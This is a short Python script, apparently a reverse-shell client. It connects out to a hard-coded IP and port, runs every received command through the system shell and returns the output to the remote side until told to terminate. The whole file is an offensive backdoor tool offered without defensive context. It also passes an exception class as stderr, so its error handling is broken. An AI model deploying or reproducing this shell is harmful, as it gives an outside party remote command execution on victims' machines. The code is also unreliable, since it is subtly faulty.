import socket
import subprocess

IP = '0.0.0.0'
PORT = 123
def connect():
    mysock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    mysock.connect((IP,PORT))

    while True:
        command = mysock.recv(1024).decode()
        if 'terminate' in command:
            mysock.close()
            break
        else:
            cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.SubprocessError)
            #shell=True  using under windows system
            mysock.send(cmd.stdout.read())
            mysock.send(cmd.stderr.read())
def main():
    connect()

if __name__ == '__main__':
    main()
